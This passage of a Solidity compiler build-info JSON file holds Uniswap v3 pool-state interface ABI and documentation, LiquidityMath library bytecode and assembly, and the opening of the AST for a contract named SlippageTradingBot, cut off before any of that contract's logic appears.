							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"slot0()": {
								"returns": {
									"sqrtPriceX96": "The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "Pool state that can change",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"liquidity()": "1a686502",
							"observations(uint256)": "252c09d7",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"slot0()": "3850c7bd",
							"tickBitmap(int16)": "5339c296",
							"ticks(int24)": "f30dba93"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"feeGrowthGlobal0X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeGrowthGlobal1X128\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidity\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"slot0()\":{\"returns\":{\"sqrtPriceX96\":\"The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"Pool state that can change\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"}},\"notice\":\"These methods compose the pool's state, and can change with any frequency including multiple times per transaction\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":\"IUniswapV3PoolState\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							}
						},
						"notice": "These methods compose the pool's state, and can change with any frequency including multiple times per transaction",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"LiquidityMath": {
					"abi": [],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"title": "Math library for liquidity",
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  mstore(0x00, 0x4e487b7100000000000000000000000000000000000000000000000000000000)\n  mstore(0x04, 0x00)\n  revert(0x00, 0x24)\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":109:621  library LiquidityMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220f83d522d3628d151f50708ad61cc028ea3d4d4b2f9915c62db9d4addc011d1cc64736f6c63430008140033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6055604b600b8282823980515f1a607314603f577f4e487b71000000000000000000000000000000000000000000000000000000005f525f60045260245ffd5b305f52607381538281f3fe730000000000000000000000000000000000000000301460806040525f80fdfea2646970667358221220f83d522d3628d151f50708ad61cc028ea3d4d4b2f9915c62db9d4addc011d1cc64736f6c63430008140033",
							"opcodes": "PUSH1 0x55 PUSH1 0x4B PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH0 BYTE PUSH1 0x73 EQ PUSH1 0x3F JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST ADDRESS PUSH0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF8 RETURNDATASIZE MSTORE 0x2D CALLDATASIZE 0x28 0xD1 MLOAD CREATE2 SMOD ADDMOD 0xAD PUSH2 0xCC02 DUP15 LOG3 0xD4 0xD4 0xB2 0xF9 SWAP2 0x5C PUSH3 0xDB9D4A 0xDD 0xC0 GT 0xD1 0xCC PUSH5 0x736F6C6343 STOP ADDMOD EQ STOP CALLER ",
							"sourceMap": "109:512:9:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "730000000000000000000000000000000000000000301460806040525f80fdfea2646970667358221220f83d522d3628d151f50708ad61cc028ea3d4d4b2f9915c62db9d4addc011d1cc64736f6c63430008140033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF8 RETURNDATASIZE MSTORE 0x2D CALLDATASIZE 0x28 0xD1 MLOAD CREATE2 SMOD ADDMOD 0xAD PUSH2 0xCC02 DUP15 LOG3 0xD4 0xD4 0xB2 0xF9 SWAP2 0x5C PUSH3 0xDB9D4A 0xDD 0xC0 GT 0xD1 0xCC PUSH5 0x736F6C6343 STOP ADDMOD EQ STOP CALLER ",
							"sourceMap": "109:512:9:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "92",
								"totalCost": "17092"
							},
							"internal": {
								"addDelta(uint128,int128)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH #[$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "B"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "CODECOPY",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MLOAD",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "BYTE",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "73"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "EQ",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "4"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "24"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "REVERT",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "tag",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "ADDRESS",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "PUSH",
									"source": 9,
									"value": "73"
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "MSTORE8",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 109,
									"end": 621,
									"name": "RETURN",
									"source": 9
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f83d522d3628d151f50708ad61cc028ea3d4d4b2f9915c62db9d4addc011d1cc64736f6c63430008140033",
									".code": [
										{
											"begin": 109,
											"end": 621,
											"name": "PUSHDEPLOYADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "ADDRESS",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "80"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 109,
											"end": 621,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 109,
											"end": 621,
											"name": "REVERT",
											"source": 9
										}
									]
								}
							},
							"sourceList": [
								"contracts/tradingbot.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"Math library for liquidity\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":\"LiquidityMath\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/tradingbot.sol": {
				"ast": {
					"absolutePath": "contracts/tradingbot.sol",
					"exportedSymbols": {
						"IUniswapV3Factory": [
							1272
						],
						"IUniswapV3Pool": [
							1294
						],
						"IUniswapV3PoolActions": [
							1390
						],
						"IUniswapV3PoolDerivedState": [
							1421
						],
						"IUniswapV3PoolEvents": [
							1540
						],
						"IUniswapV3PoolImmutables": [
							1580
						],
						"IUniswapV3PoolOwnerActions": [
							1606
						],
						"IUniswapV3PoolState": [
							1714
						],
						"LiquidityMath": [
							1766
						],
						"SlippageTradingBot": [
							1189
						]
					},
					"id": 1190,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "33:24:0"
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"file": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"id": 2,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1190,
							"sourceUnit": 1273,
							"src": "108:97:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"file": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"id": 3,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1190,
							"sourceUnit": 1295,
							"src": "207:94:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"file": "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"id": 4,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1190,
							"sourceUnit": 1767,
							"src": "303:92:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "SlippageTradingBot",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 1189,
							"linearizedBaseContracts": [
								1189
							],
							"name": "SlippageTradingBot",
							"nameLocation": "408:18:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 6,
									"mutability": "mutable",
									"name": "liquidity",
									"nameLocation": "442:9:0",
									"nodeType": "VariableDeclaration",
									"scope": 1189,
									"src": "437:14:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 5,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "437:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"eventSelector": "3f4affeca3b3b35f3a4e3b846a4cbf67234bcb30e4e6cb47cb8645ccadf2a7ac",
									"id": 14,
									"name": "Log",
									"nameLocation": "464:3:0",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 8,
												"indexed": false,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 14,
												"src": "468:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 7,
													"name": "string",
													"nodeType": "ElementaryTypeName",
